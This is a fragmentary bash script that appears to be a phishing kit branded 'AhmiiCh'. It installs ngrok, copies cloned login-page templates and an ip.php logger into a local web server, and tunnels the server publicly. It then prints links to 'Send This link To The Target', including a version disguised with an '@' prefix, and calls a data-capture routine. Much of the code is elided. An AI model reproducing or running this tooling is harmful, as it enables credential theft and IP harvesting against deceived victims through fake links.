...
banner_Ahmii() {
	cat <<- EOF
${RED}___  _  _ _ ____ _  _ _ _  _ ____ 
${RED}|__] |__| | [__  |__| | |\ | | __ 
${RED}|    |  | | ___] |  | | | \| |__] 
	EOF
}
...
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		...
		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN}  Installing..."${WHITE}
		arch=`uname -m`
	...
	if [[ -e ".server/ngrok2" ]]; then
		...
		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN}  Server Installing..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
${GREEN} Channel Name: Ahmad Tricker 
${GREEN} Facebook I'd: Ahmii Ch
${RED} Facebook page : Helping Zone
${RED} Main Menu     
${RED} Exit
	EOF
...
setup_site() {
	...
	cp -rf AhmiiCh/"$website"/* .server/www
	cp -f  AhmiiCh/ip.php .server/www/
...
## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} AhmiiCh server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} $2"
	sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &
	{ sleep 8; clear; banner_Ahmii; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Send This link To The Target Orignal link: ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Send This link To The Target Edit link: ${GREEN}$AhmiiCh@$ngrok_url1"
	capture_data
}
...
${RED}[${WHITE}03${RED}]${ORANGE} link Editor M416 Glacier	
	...
	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		...
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_Ahmii; AhmiiCh_facebook; }
	fi
}
